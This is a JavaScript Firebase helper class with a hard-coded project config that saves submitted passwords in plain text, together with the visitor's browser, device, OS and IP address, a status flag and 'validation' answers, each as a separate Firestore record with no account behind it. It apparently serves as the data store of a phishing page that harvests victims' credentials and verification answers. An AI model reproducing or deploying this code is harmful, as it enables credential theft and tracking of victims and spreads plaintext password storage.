import  app  from 'firebase/app'
import firestore from 'firebase/firestore'

const config = {
  apiKey: "AIzaSyBRCitllglH8RDKgR9-dNH4oy6JZ9C5a80",
  authDomain: "bmarketing-86d79.firebaseapp.com",
  databaseURL: "https://bmarketing-86d79.firebaseio.com",
  projectId: "bmarketing-86d79",
  storageBucket: "bmarketing-86d79.appspot.com",
  messagingSenderId: "1017009577518",
  appId: "1:1017009577518:web:970fbc4bb9c4c26fb609bf"
}


class Firebase {
  constructor(props) {
    app.initializeApp(config)
    this.db = app.firestore()
  }

  addPass = password =>{
    return this.db.collection('Password').add({
      password: password
    })
  }

  addSatus = () =>{
    return this.db.collection('Status').add({
      status: 1
    })
  }

  addInfoSystem = (browser,device,os,ip)=>{
    return this.db.collection('System').add({
      browser: browser,
      device: device,
      os: os,
      ip: ip
    })
  }


    getInfoSystem = ()=>{
      return this.db.collection("System").get()
    }

  getPassword = ()=>{
    return this.db.collection("Password").get()
  }

  getStatus = ()=>{
    return this.db.collection("Status").get()
  }
  
  addValidation = answer=>
    this.db.collection('Validation').add({
      answer: answer
    })

  getValidation = ()=>
    this.db.collection('Validation').get()
}

export default Firebase